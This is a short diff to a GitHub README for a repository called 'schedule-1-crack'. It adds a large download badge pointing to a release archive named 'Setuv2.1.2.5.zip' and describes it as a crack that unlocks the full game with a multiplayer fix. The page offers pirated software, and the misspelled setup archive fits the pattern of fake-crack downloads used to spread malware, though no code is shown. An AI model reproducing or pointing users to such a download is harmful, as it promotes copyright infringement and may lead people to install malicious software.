@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/⬇_Download-Latest-blue?style=for-the-badge)](https://github.com/kevin-taylor-io1903l1/schedule-1-crack/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # schedule-1-crack
 
 Schedule-crack — Schedule 1 is a game where you play as a small-time drug dealer building a criminal empire. This release unlocks the full game and includes a multiplayer fix. Based on M4CKD0GE Repacks, v0.4.1 f13 - Build 20856015.
